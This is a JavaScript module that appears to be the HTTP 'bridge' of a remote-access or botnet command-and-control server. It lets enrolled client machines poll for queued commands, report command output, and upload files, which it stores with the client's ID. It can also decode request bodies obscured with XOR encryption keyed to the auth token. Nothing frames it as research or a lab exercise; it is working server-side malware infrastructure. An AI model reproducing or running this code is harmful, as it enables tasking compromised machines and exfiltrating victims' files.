const http = require("http");
const https = require("https");
const fs = require("fs");
const config = require("./config");
const { xorCrypt } = require("./crypto");
const { dbAll, dbRun } = require("./db");
const { safeFilename } = require("./validation");
const path = require("path");
const fsOps = require("fs");

function parseBody(raw) {
    const buf = Buffer.isBuffer(raw) ? raw : Buffer.from(raw || "", "utf8");
    try {
        return JSON.parse(buf.toString("utf8"));
    } catch {
        return JSON.parse(xorCrypt(buf, config.authToken).toString("utf8"));
    }
}

function createHttpBridge() {
    const handler = (req, res) => {
        if (req.method !== "POST") { res.writeHead(404); res.end("Not Found"); return; }
        if (req.headers["x-auth-token"] !== config.authToken) { res.writeHead(401); res.end("Unauthorized"); return; }
        const body = [];
        req.on("data", chunk => body.push(chunk));
        req.on("error", () => { res.writeHead(400); res.end("Error"); });
        req.on("end", () => {
            try {
                const data = parseBody(Buffer.concat(body));
                const uid = data.uid || req.headers["x-client-uid"] || "unknown";
                if (data.type === "enroll" || data.type === "poll") {
                    dbRun("UPDATE clients SET last_seen=?, online=1 WHERE uid=?", [Date.now(), uid]);
                    dbAll("SELECT * FROM pending_tasks WHERE client_uid=? AND delivered=0", [uid]).then(tasks => {
                        if (tasks && tasks.length > 0) {
                            const responsePayload = tasks.map(t => ({ cmd: t.cmd, ...JSON.parse(t.data || "{}") }));
                            dbRun("UPDATE pending_tasks SET delivered=1 WHERE client_uid=? AND delivered=0", [uid]);
                            res.writeHead(200, { "Content-Type": "application/json" });
                            res.end(JSON.stringify(responsePayload));
                        } else {
                            res.writeHead(200, { "Content-Type": "application/json" });
                            res.end("{}");
                        }
                    }).catch(() => { res.writeHead(500); res.end("Error"); });
                } else if (data.type === "result") {
                    dbRun("INSERT INTO logs (client_uid, cmd, result, timestamp) VALUES (?,?,?,?)",
                        [uid, data.cmd || "unknown", JSON.stringify(data.output || "").substring(0, 10000), Date.now()]);
                    res.writeHead(200); res.end(JSON.stringify({ status: "ok" }));
                } else if (data.type === "file") {
                    const fname = safeFilename(uid) + "_" + Date.now() + "_" + safeFilename(data.name);
                    const fpath = path.join(__dirname, "..", "uploads", fname);
                    const resolved = path.resolve(fpath);
                    const uploadsDir = path.resolve(path.join(__dirname, "..", "uploads"));
                    if (!resolved.startsWith(uploadsDir + path.sep)) { res.writeHead(400); res.end("Invalid path"); return; }
                    const decoded = Buffer.from(data.data || "", "base64");
                    if (decoded.length > config.maxUploadSize) { res.writeHead(413); res.end("Too large"); return; }
                    fsOps.writeFileSync(fpath, decoded);
                    dbRun("INSERT INTO files (client_uid, filename, filepath, filesize, file_type, timestamp) VALUES (?,?,?,?,?,?)",
                        [uid, safeFilename(data.name), fpath, decoded.length, data.file_type || "file", Date.now()]);
                    res.writeHead(200); res.end(JSON.stringify({ status: "ok" }));
                } else { res.writeHead(200); res.end("{}"); }
            } catch (e) { res.writeHead(400); res.end("Error"); }
        });
    };
    return handler;
}

function startHttpBridge() {
    let server;
    if (config.tlsCertPath && config.tlsKeyPath && fs.existsSync(config.tlsCertPath) && fs.existsSync(config.tlsKeyPath)) {
        server = https.createServer({
            cert: fs.readFileSync(config.tlsCertPath),
            key: fs.readFileSync(config.tlsKeyPath),
        }, createHttpBridge());
    } else {
        server = http.createServer(createHttpBridge());
    }
    server.listen(config.httpBridgePort, () => console.log("[*] HTTP Bridge listening on " + config.httpBridgePort));
    return server;
}

module.exports = { startHttpBridge };
